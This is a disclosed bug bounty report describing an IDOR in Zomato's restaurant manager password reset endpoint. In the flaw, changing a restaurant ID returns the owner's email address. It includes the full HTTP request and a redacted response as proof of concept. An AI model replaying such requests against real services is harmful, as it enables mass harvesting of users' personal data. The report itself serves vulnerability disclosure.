# [www.zomato.com] Leaking Email Addresses of merchants via reset password feature

## Report Details
- **Report ID**: 293490
- **URL**: https://hackerone.com/reports/293490
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-11-28T17:09:07.085Z
- **Disclosed**: 2021-02-18T06:35:53.058Z

## Reporter
- **Username**: prateek_0490
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
Hi Team,

# Introduction

Found a cool IDOR, which again leaks the email addresses of all Zomato Users. This attack works no matter if you own the restaurant or not.

# Proof of Concept

- Below Post Request leaks the email addresses of the Restaurant Owners in response -

> Request

```
POST /php/restaurant_manager_reset_password.php HTTP/1.1
Host: www.zomato.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
Referer: https://www.zomato.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: <Your Cookies HERE>
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

res_id=2100935
```

> Response

```
{"status":"success","message":"You will receive a recovery mail at ██████████@gmail.com, if it's in our database. Please check your inbox to start the password recovery process."}
```

- Now, testing with the restaurants against which I don't own (below snapshot), I purposely first found the restaurant which isn't active then I threw this request at that particular restaurant.

███████

- This means, this can help an attacker to extract millions of emails from Zomato's database. This would be a Huge Leak if an attacker gets an access to this POST REQUEST.

Best Regards,
Prateek Tiwari

## Impact

# Impact

This can allow an attacker to extract all the emails from the Zomato Database. A big leak. And we all know emails are of course the logins as well so this I would categorize as the huge leak considering the nature of the business.

## Attachments
No attachments
